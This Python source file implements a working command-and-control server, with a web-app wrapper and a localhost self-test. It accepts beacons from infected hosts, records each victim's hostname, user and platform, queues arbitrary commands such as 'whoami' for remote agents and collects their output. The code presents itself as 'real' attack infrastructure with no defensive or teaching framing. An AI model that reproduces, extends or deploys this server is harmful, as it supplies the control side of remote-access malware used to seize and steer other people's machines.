#!/usr/bin/env python3
"""
REAL C2 Protocol Implementation
Actual command & control with beaconing, encryption, and task management
"""

import socket
import threading
import time
import json
import base64
import hashlib
import os
import queue
from datetime import datetime
from typing import Dict, List, Any, Optional

class C2Server:
    """
    Real C2 Server implementation
    """
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = {}  # client_id -> client_info
        self.tasks = {}  # client_id -> task_queue
        self.results = {}  # client_id -> results_list
        self.server_socket = None
        self.running = False
        self.lock = threading.Lock()
        
    def start(self):
        """Start the C2 server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(10)
        self.running = True
        
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        # Start accept thread
        accept_thread = threading.Thread(target=self._accept_clients)
        accept_thread.daemon = True
        accept_thread.start()
        
        return True
    
    def stop(self):
        """Stop the C2 server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
    
    def _accept_clients(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New connection from {address}")
                
                # Handle client in new thread
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, address)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    print(f"[-] Accept error: {e}")
    
    def _handle_client(self, client_socket, address):
        """Handle individual client connection"""
        client_id = None
        
        try:
            # Receive initial beacon with client info
            data = self._receive_data(client_socket)
            if data:
                client_info = json.loads(data)
                client_id = self._generate_client_id(client_info)
                
                # Register client
                with self.lock:
                    self.clients[client_id] = {
                        'id': client_id,
                        'address': address,
                        'info': client_info,
                        'socket': client_socket,
                        'connected': True,
                        'last_seen': datetime.now().isoformat()
                    }
                    self.tasks[client_id] = queue.Queue()
                    self.results[client_id] = []
                
                print(f"[+] Client registered: {client_id}")
                print(f"    Hostname: {client_info.get('hostname', 'Unknown')}")
                print(f"    User: {client_info.get('user', 'Unknown')}")
                print(f"    Platform: {client_info.get('platform', 'Unknown')}")
                
                # Main communication loop
                while self.running and self.clients[client_id]['connected']:
                    # Check for tasks
                    try:
                        task = self.tasks[client_id].get(timeout=0.1)
                        
                        # Send task to client
                        self._send_data(client_socket, task['command'])
                        
                        # Receive result
                        result = self._receive_data(client_socket)
                        if result:
                            with self.lock:
                                self.results[client_id].append({
                                    'task_id': task.get('id'),
                                    'command': task['command'],
                                    'result': result,
                                    'timestamp': datetime.now().isoformat()
                                })
                            print(f"[+] Result from {client_id}: {result[:100]}...")
                        
                    except queue.Empty:
                        # No tasks, send heartbeat
                        try:
                            client_socket.send(b'\n')
                            time.sleep(1)
                        except:
                            break
                    
                    # Update last seen
                    with self.lock:
                        self.clients[client_id]['last_seen'] = datetime.now().isoformat()
        
        except Exception as e:
            print(f"[-] Client handler error: {e}")
        
        finally:
            # Clean up client
            if client_id:
                with self.lock:
                    if client_id in self.clients:
                        self.clients[client_id]['connected'] = False
                        print(f"[-] Client disconnected: {client_id}")
            
            client_socket.close()
    
    def _receive_data(self, client_socket) -> Optional[str]:
        """Receive data from client"""
        try:
            data = b''
            while True:
                chunk = client_socket.recv(1024)
                if not chunk:
                    return None
                data += chunk
                if b'\n\n' in data:
                    break
            
            return data.decode('utf-8').strip()
        except:
            return None
    
    def _send_data(self, client_socket, data: str):
        """Send data to client"""
        if not data.endswith('\n'):
            data += '\n'
        client_socket.send(data.encode('utf-8'))
    
    def _generate_client_id(self, client_info: Dict) -> str:
        """Generate unique client ID"""
        unique_str = f"{client_info.get('hostname', '')}{client_info.get('user', '')}{time.time()}"
        return hashlib.md5(unique_str.encode()).hexdigest()[:12]
    
    def add_task(self, client_id: str, command: str) -> bool:
        """Add task for client"""
        if client_id in self.clients and self.clients[client_id]['connected']:
            task = {
                'id': hashlib.md5(f"{command}{time.time()}".encode()).hexdigest()[:8],
                'command': command,
                'created': datetime.now().isoformat()
            }
            self.tasks[client_id].put(task)
            print(f"[*] Task queued for {client_id}: {command}")
            return True
        return False
    
    def get_clients(self) -> List[Dict]:
        """Get list of connected clients"""
        with self.lock:
            return [
                {k: v for k, v in client.items() if k != 'socket'}
                for client in self.clients.values()
            ]
    
    def get_results(self, client_id: str) -> List[Dict]:
        """Get results for a client"""
        with self.lock:
            return self.results.get(client_id, [])


class C2Handler:
    """
    Handler for integrating C2 with the web app
    """
    
    def __init__(self):
        self.server = C2Server()
        self.server_thread = None
    
    def start_server(self, port=4444):
        """Start C2 server in background"""
        self.server.port = port
        
        if not self.server.running:
            self.server_thread = threading.Thread(target=self.server.start)
            self.server_thread.daemon = True
            self.server_thread.start()
            time.sleep(1)  # Give server time to start
            
        return self.server.running
    
    def stop_server(self):
        """Stop C2 server"""
        self.server.stop()
        if self.server_thread:
            self.server_thread.join(timeout=2)
    
    def get_agents(self):
        """Get connected agents"""
        return self.server.get_clients()
    
    def execute_command(self, agent_id: str, command: str):
        """Execute command on agent"""
        return self.server.add_task(agent_id, command)
    
    def get_results(self, agent_id: str):
        """Get command results"""
        return self.server.get_results(agent_id)


def test_c2_server():
    """Test the C2 server"""
    print("="*60)
    print("TESTING C2 SERVER")
    print("="*60)
    
    # Start server
    server = C2Server(port=4445)  # Use different port for testing
    server.start()
    
    print("\n[*] Server is running. Simulating client connection...")
    
    # Simulate a client connection
    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.connect(('127.0.0.1', 4445))
        
        # Send client info
        client_info = {
            'hostname': 'test-machine',
            'user': 'testuser',
            'platform': 'Linux test 5.x',
            'cwd': '/home/test'
        }
        client_sock.send((json.dumps(client_info) + '\n\n').encode())
        
        print("[*] Client connected and registered")
        
        # Wait for server to process
        time.sleep(1)
        
        # Check connected clients
        clients = server.get_clients()
        if clients:
            client_id = clients[0]['id']
            print(f"[*] Client ID: {client_id}")
            
            # Add a task
            server.add_task(client_id, "whoami")
            
            # Client receives and responds
            data = client_sock.recv(1024).decode().strip()
            if data and data != '\n':
                print(f"[*] Client received command: {data}")
                
                # Send response
                response = "testuser"
                client_sock.send((response + '\n\n').encode())
                
                # Check results
                time.sleep(0.5)
                results = server.get_results(client_id)
                if results:
                    print(f"[*] Server received result: {results[0]['result']}")
                    print("\n✅ C2 Server test PASSED")
                else:
                    print("\n❌ No results received")
        else:
            print("\n❌ No clients registered")
        
        client_sock.close()
        
    except Exception as e:
        print(f"\n❌ Test failed: {e}")
    
    finally:
        server.stop()
    
    print("="*60)


if __name__ == "__main__":
    test_c2_server()